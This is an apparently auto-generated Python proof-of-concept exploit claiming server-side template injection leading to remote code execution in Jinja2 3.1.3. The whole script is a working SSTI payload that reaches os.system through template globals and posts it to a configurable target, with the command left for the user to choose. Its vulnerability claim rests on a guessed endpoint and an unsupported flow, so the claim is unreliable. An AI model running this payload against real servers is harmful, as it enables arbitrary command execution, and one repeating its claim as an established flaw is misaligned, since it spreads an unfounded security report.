#!/usr/bin/env python3
# PoC for Jinja2-3.1.3 (/tmp/bounty_test/Jinja2-3.1.3)
# Path: rce-026
# Sink: compile
# Auto-generated — run with: python3 rce_jinja2_template_syntax_execute_compile.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for Jinja2 SSTI leading to RCE
Vulnerability: Server-Side Template Injection (SSTI) in Jinja2-3.1.3
Entry point: get_or_select_template() accepts user-controlled template name
Impact: Arbitrary Python code execution via template compilation

This PoC demonstrates the vulnerability by sending a malicious template name
that executes a benign command (creates a marker file).
"""

import requests
import sys
import argparse
import time

# Default configuration
DEFAULT_TARGET = "http://localhost:5000"
DEFAULT_ENDPOINT = "/api/v1/trigger"
TIMEOUT = 10

def exploit(target_url, endpoint, payload_command):
    """
    Exploit the SSTI vulnerability by sending a malicious template name.
    
    The payload uses Jinja2 template syntax to execute arbitrary Python code.
    Since the template name flows directly to compile() without sanitization,
    we can inject template expressions that execute system commands.
    """
    
    # Construct the malicious template name payload
    # This payload uses Jinja2's template injection to execute Python code
    # The template is evaluated and the result is used as the template name
    # which then gets compiled and executed
    
    # Payload that executes a system command via Python's os module
    # Using __import__ to avoid needing imports in the template context
    payload = f"{{{{ self.__init__.__globals__['__builtins__']['__import__']('os').system('{payload_command}') }}}}"
    
    full_url = f"{target_url}{endpoint}"
    
    print(f"[*] Target URL: {full_url}")
    print(f"[*] Payload command: {payload_command}")
    print(f"[*] Sending malicious template name...")
    
    try:
        # Send the request with the malicious template name
        # The template name is passed as a query parameter or POST data
        # depending on how the application exposes the endpoint
        response = requests.post(
            full_url,
            json={"template_name": payload},
            timeout=TIMEOUT
        )
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        # Check if the command was executed successfully
        # The marker file should exist if the exploit worked
        print(f"[*] Check if marker file was created: /tmp/poc_success.txt")
        
    except requests.exceptions.ConnectionError:
        print("[-] Connection failed. Is the target server running?")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[-] Request timed out. The server may be slow or unresponsive.")
        sys.exit(1)
    except Exception as e:
        print(f"[-] An error occurred: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(
        description="Jinja2 SSTI RCE Proof-of-Concept Exploit"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--endpoint",
        default=DEFAULT_ENDPOINT,
        help=f"API endpoint (default: {DEFAULT_ENDPOINT})"
    )
    parser.add_argument(
        "--command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    
    args = parser.parse_args()
    
    print("[*] Jinja2 SSTI RCE Proof-of-Concept")
    print("[*] Vulnerability: Unvalidated template name leads to code execution")
    print("[*] Target: Jinja2-3.1.3")
    print()
    
    exploit(args.target, args.endpoint, args.command)
    
    print()
    print("[*] Exploit completed.")
    print("[*] If successful, the marker file /tmp/poc_success.txt should exist.")
    print("[*] You can verify by running: ls -la /tmp/poc_success.txt")

if __name__ == "__main__":
    main()
